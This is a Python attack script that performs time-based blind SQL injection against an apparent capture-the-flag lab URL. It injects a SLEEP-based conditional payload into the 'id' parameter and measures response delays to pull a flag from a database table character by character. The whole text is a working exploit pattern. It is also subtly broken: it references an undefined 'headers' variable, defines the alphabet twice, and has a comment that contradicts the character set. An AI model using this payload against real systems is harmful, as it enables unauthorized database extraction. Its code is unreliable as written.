import requests
import time
import string

# Target URL and headers
url = "https://mtyrm2cimi.voorivex-lab.online/index.php"  # Replace with the actual URL

alphabet = string.digits + string.ascii_lowercase

# Parameters for the flag extraction
max_length = 50  # Assuming flag text won't exceed 50 characters
alphabet = string.digits + string.ascii_lowercase


# Function to perform the injection
def extract_flag():
    flag = ""

    for position in range(1, max_length + 1):
        char_found = False

        for i in alphabet:  # Printable ASCII range
            # Payload for blind SQL injection
            payload = f"1' AND IF(SUBSTRING((SELECT flag_text FROM flag),{position},1)='{i}', SLEEP(5), 0)#"

            # Injecting the payload with the 'id' parameter
            params = {"id": payload}

            # Measure response time
            start_time = time.time()
            requests.get(url, headers=headers, params=params)
            response_time = time.time() - start_time

            # Check if delay occurred (indicating a match)
            if response_time > 5:  # Adjust threshold as needed
                flag += i
                char_found = True
                print(f"Found character: {i} at position {position}")
                break

        # Stop if no character is found (end of flag text)
        if not char_found:
            break

    return flag


# Running the extraction
flag_text = extract_flag()
print(f"The extracted flag text is: {flag_text}")